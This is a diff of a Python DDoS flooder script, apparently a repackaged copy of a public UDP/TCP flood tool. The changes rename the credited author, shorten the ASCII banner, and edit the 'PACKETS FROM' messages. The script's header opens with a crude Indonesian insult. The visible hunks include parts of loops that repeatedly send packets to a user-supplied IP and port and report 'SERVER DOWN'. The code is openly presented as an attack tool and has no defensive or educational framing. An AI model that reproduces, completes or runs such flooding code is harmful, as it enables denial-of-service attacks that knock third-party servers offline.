@@ -1,7 +1,7 @@
 """
 AWAS KAU CURI KONTOL
 UDP Flooder.
-TOOL DDOS ATTACK BY XALBADOR.
+TOOL DDOS ATTACK BY KEPIN:S4MP.
 """
 import signal
 import time
@@ -18,13 +18,13 @@ os.system("figlet DDOS ATTACK -f slant")
 print("\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n")
 
 os.system("clear")
-print("  ToolsDdos By : XalbadorX ")
-print("  ██╗░░██╗██╗░░░░░██████╗░██████╗░ ")
-print("  ╚██╗██╔╝██║░░░░░██╔══██╗██╔══██╗ ")
-print("  ░╚███╔╝░██║░░░░░██████╦╝██║░░██║ ")
-print("  ░██╔██╗░██║░░░░░██╔══██╗██║░░██║ ")
-print("  ██╔╝╚██╗███████╗██████╦╝██████╔╝ ")
-print("  ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░ ")
+print("  ToolsDdos By : KEPIN:S4MP ")
+print("  ██╗░░██╗ ")
+print("  ╚██╗██╔╝ ")
+print("  ░╚███╔╝░ ")
+print("  ░██╔██╗  ")
+print("  ██╔╝╚██╗ ")
+print("  ╚═╝░░╚═╝ ")
 print("  KETIK : Python-UDP-Flood ")
 print("  KETIK : Python-TCP-Flood ")
 
@@ -45,7 +45,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKETS FROM KEPIN:S4MP!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
@@ -60,7 +60,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PACKETS FROM XALBADOR!!!")
+			print(i +" PACKETS FROM KEPIN:S4MP!!!")
 		except:
 			s.close()
 			print("[*] SERVER DOWN!!!")
